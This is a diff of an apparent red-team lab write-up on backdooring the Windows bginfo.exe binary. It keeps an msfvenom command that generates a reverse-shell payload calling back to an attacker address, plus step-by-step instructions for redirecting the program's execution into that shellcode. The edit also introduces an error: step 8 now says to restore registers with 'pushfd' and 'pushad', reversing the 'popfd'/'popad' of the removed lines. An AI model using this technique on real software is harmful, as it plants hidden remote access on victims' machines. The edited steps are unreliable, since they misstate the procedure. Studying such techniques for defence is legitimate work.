@@ -15,8 +15,10 @@ The purpose of this lab is to learn the Portable Executable (PE) backdooring tec
 # Generate Shellcode
 First of, let's generate the shellcode so we know how many bytes of space we will need in the new PE section:
 
-```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 | hexdump -C```  
-![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/fb73271e-7bcc-4e0f-bf7b-a0dab96a4d04)  
+```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 | hexdump -C```
+
+![image](https://github.com/0x074b/Code-Process_Injection/assets/83349783/fb73271e-7bcc-4e0f-bf7b-a0dab96a4d04)
+
 Note that the shellcode size is 324 bytes - the new PE section will have to be at least that big.
 
 # New PE Code Section
@@ -56,30 +58,29 @@ In previous paragraph we confirmed the shellcode can be executed, but we did thi
 
 The process of patching the binary to redirect the code execution flow is as follows:
 
-*1. Find the first instruction that is 5 bytes in size inside the bginfo.exe binary*  
-*1.1 We will overwrite this instruction with a jump to the shellcode as explained in step 2*  
-*1.2 Prior to overwriting this instruction, write it down somewhere - we will need to append it to our shellcode later in order to restore the code   execution flow*  
-*1.3 Write down the address of the next instruction to be executed next - after the shellcode has been executed, stack and registers restored, we will jump back to this address to let the bginfo.exe continue as normal*  
-
-*2. Overwrite the instruction in step 1 with a jump to the shellcode at 4D8000‬*  
-
-*3. Save registers' and flags' state by prepending the shellcode with ```pushad``` and ```pushfd``` instructions - we do this so we can restore their state before redirecting the execution back to bginfo.exe and avoid any crashes*  
-
-*4. Remember the ESP register value - we will need this when calculating by how much the stack size grew during the shellcode execution. This is required in order to restore the stack frame before redirecting the code execution back to bginfo.exe*
-
-*5. Modify the shellcode:*  
-*5.1 Make sure that ```WaitForSingleObject``` does not wait indefinitely and does not freeze bginfo.exe once the shellcode is executed*  
-*5.2 Remove the last instruction of the shellcode ```call ebp``` to prevent the shellcode from shutting down of bginfo.exe*
-
-*6. Note the ESP value and the end of shellcode execution - this is related to point 4 and 7*
-
-*7. Restore the stack pointer ESP to what it was after the shellcode executed ```pushad``` and ```pushfd``` as explained in step 3, with . This is where ESPs from point 4 and 7 comes in to play* ```add esp, <ESP_POST_SHELLCODE - ESP_PRE_SHELLCODE>```
-
-*8. Restore registers with ```popfd``` and ```popad```*
-
-*9. Append the shellcode with the instruction we had overwritten in step 1*
-
-*10. Restore code execution back to bginfo by jumping back to the next instruction after the owerwritten one as explained in 1.3*
+<ol>
+  <li>Find the first instruction that is 5 bytes in size inside the bginfo.exe binary
+   <ol>
+     <li>We will overwrite this instruction with a <em><strong>jump</strong></em> to the shellcode as explained in step 2</li>
+     <li>Prior to overwriting this instruction, write it down somewhere - we will need to append it to our shellcode later in order to restore the code execution flow</li>
+     <li>Write down the address of the next instruction to be executed next - after the shellcode has been executed, stack and registers restored, we will jump back to this address to let the bginfo.exe continue as normal</li>
+   </ol>
+  </li>
+  <li>Overwrite the instruction in step 1 with a jump to the shellcode at 4D8000‬</li>
+  <li>Save registers' and flags' state by prepending the shellcode with <em><strong>pushad</strong></em> and <em><strong>pushfd</strong></em> instructions - we do this so we can restore their state before redirecting the execution back to bginfo.exe and avoid any crashes</li>
+  <li>Remember the ESP register value - we will need this when calculating by how much the stack size grew during the shellcode execution. This is required in order to restore the stack frame before redirecting the code execution back to bginfo.exe</li>
+  <li>Modify the shellcode
+    <ol>
+      <li>Make sure that <em><strong>WaitForSingleObject</strong></em> does not wait indefinitely and does not freeze bginfo.exe once the shellcode is executed</li>
+      <li>Remove the last instruction of the shellcode <em><strong>call ebp</strong></em> to prevent the shellcode from shutting down of bginfo.exe</li>
+    </ol>
+  </li>
+  <li>Note the ESP value and the end of shellcode execution - this is related to point 4 and 7</li>
+  <li>Restore the stack pointer ESP to what it was after the shellcode executed <em><strong>pushad</strong></em> and <em><strong>pushfd</strong></em> as explained in step 3, with . This is where ESPs from point 4 and 7 comes in to play <em><strong>add esp, <ESP_POST_SHELLCODE - ESP_PRE_SHELLCODE></strong></em></li>
+  <li>Restore registers with <em><strong>pushfd</strong></em> and <em><strong>pushad</strong></em></li>
+  <li>Append the shellcode with the instruction we had overwritten in step 1</li>
+  <li>Restore code execution back to bginfo by jumping back to the next instruction after the owerwritten one as explained in 1.3</li>
+</ol>
 
 # Overwriting 5 byte Instruction
 
